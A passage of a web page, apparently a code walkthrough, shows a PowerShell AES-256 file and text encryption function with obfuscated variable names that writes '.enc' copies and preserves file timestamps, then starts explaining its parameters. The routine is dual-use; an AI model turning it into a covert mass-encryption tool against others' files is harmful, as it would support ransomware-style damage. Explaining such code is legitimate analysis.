style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> Invoke-AESEncryption\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">CmdletBinding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">()]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">OutputType\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">string\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Param\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Key\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptText\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Text\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptFile\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Path)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Begin\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $m95I \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.SHA256Managed\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.AesManaged\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.CipherMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::CBC\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.PaddingMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::PKCS7\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.BlockSize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 128\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.KeySize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 256\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Process\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Key \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $m95I.ComputeHash([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Key))\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {$plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Text)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $File \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path $Path \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ErrorAction SilentlyContinue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">         if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$File.FullName) { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ReadAllBytes($File.FullName)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $outPath \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.FullName \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \".enc\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptor \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.CreateEncryptor()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptor.TransformFinalBlock($plainBytes\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 0\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $plainBytes.Length)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.IV \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Dispose()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Convert\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ToBase64String($encryptedBytes)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::WriteAllBytes($outPath\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $outPath).LastWriteTime \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.LastWriteTime }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">  End\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $m95I.Dispose()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Dispose()}}\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function Invoke-AESEncryption {\n   [CmdletBinding()]\n   [OutputType([string])]\n   Param(\n       [Parameter(Mandatory = $true)]\n       [String]$Key,\n       [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptText&#x22;)]\n       [String]$Text,\n       [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptFile&#x22;)]\n       [String]$Path)\n   Begin {\n      $m95I = New-Object System.Security.Cryptography.SHA256Managed\n      $n9ibn = New-Object System.Security.Cryptography.AesManaged\n      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\n      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n      $n9ibn.BlockSize = 128\n      $n9ibn.KeySize = 256 }\n   Process {\n      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n      if ($Path) {\n         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n         if (!$File.FullName) { break }\n         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n         $outPath = $File.FullName + &#x22;.enc&#x22; }\n      $encryptor = $n9ibn.CreateEncryptor()\n      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n      $encryptedBytes = $n9ibn.IV + $encryptedBytes\n      $n9ibn.Dispose()\n      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n      if ($Path) {\n         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\n  End {\n      $m95I.Dispose()\n      $n9ibn.Dispose()}}\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Param block:\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Param\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Key\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptText\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Text\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptFile\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">     [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Path)\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"Param(\n     [Parameter(Mandatory = $true)]\n     [String]$Key,\n     [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptText&#x22;)]\n     [String]$Text,\n     [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptFile&#x22;)]\n     [String]$Path)\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 